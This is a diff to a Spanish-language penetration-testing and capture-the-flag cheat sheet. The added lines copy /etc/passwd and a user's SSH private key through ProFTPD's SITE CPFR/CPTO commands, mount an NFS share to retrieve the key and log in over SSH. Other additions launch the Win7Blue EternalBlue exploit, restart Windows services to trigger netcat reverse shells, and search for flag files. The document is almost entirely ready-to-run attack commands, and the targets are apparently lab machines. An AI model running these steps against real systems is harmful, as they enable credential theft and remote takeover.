@@ -112,9 +112,9 @@ ________________________________________________________________________________
 
 # Enumera los puertos abiertos
 	nmap -vv -sVC -T5 [RHOST]   ---   CTF
+	nmap -vv -T5 -sV --script vuln [RHOST]   ---   CTF
 	nmap -vv -sC -sV -p- [RHOST]
 	nmap -vv -sV -sU [RHOST]   ---   escaneo UDP
-	nmap -vv -T5 -sV --script vuln [RHOST]
 	nmap -vv [rango IP/MS]
 
 # nmap firewall
@@ -136,6 +136,17 @@ ________________________________________________________________________________
 	exit
 # Saber la version del proFTPD
 	nc 10.10.108.111 ftp
+	SITE CPFR /etc/passwd
+	SITE CPTO /var/tmp/passwd
+# Ejemplo, consiguiendo credenciales ssh
+	SITE CPFR /home/kenobi/.ssh/id_rsa
+	SITE CPTO /var/tmp/id_rsa
+	sudo mkdir /mnt/kenobiNFS
+	sudo mount 10.10.59.82:/var /mnt/kenobiNFS
+	ls -la /mnt/kenobiNFS
+	cp /mnt/kenobiNFS/tmp/id_rsa .
+	sudo chmod 600 id_rsa 
+	ssh -i id_rsa kenobi@10.10.59.82
 
 
 SMB 445
@@ -223,12 +234,13 @@ ________________________________________________________________________________
 	searchsploit MS17-010
 	searchsploit -m 42315
 # https://acortar.link/searchsploit
-
 # GitHub > code > copiar reco
 	git clone https://github.com/d4t4s3c/Win7Blue.git
 	# Seguir indicaciones, en este caso especifico:
 	chmod +x Win7Blue   ---   Permiso de ejecucion
 	./Win7Blue
+# Ejemplo de largar exploit
+	python [Exploit Python File] [Target’s IP Address] [PORT]
 
 
 ===========================
@@ -865,6 +877,7 @@ ________________________________________________________________________________
 # Kali
 	nc -lvnp 4444
 # Target
+	net stop daclsvc   ---   en caso de necesitar parar el servicio
 	net start daclsvc
 
 
@@ -880,6 +893,7 @@ ________________________________________________________________________________
 # Kali
 	nc -lvnp 4444
 # Target
+	net stop unquotedsvc   ---   en caso de necesitar parar el servicio
 	net start unquotedsvc
 
 
@@ -892,6 +906,7 @@ ________________________________________________________________________________
 # Kali
 	nc -lvnp 4444
 # Target
+	net stop regsvc   ---   en caso de necesitar parar el servicio
 	net start regsvc
 
 
@@ -904,6 +919,7 @@ ________________________________________________________________________________
 # Kali
 	nc -lvnp 4444
 # Target
+	net stop filepermsvc   ---   en caso de necesitar parar el servicio
 	net start filepermsvc
 
 
@@ -988,7 +1004,8 @@ ________________________________________________________________________________
 
 # Windows
 	dir C:\ /s /b | find "user.txt"
-	dir C:\ /s /b | find "user.txt"
+	dir C:\ /s /b | find "flag.txt"
+	dir C:\ /s /b | find "root.txt"
 
 
 FILE TRANSFER 
